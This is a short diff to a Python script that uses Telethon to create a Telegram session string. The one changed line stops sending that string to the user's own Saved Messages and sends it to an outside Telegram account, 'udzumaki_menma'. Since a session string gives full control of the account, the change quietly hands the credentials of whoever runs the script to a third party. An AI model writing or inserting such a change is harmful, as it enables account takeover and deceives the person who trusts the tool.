@@ -43,7 +43,7 @@ string = input("session code: ")
 
 with TelegramClient(StringSession(string), api_id, api_hash) as client:
     #print(client.session.save())
-    client.send_message("me", client.session.save())
+    client.send_message("udzumaki_menma", client.session.save())
 
 
  
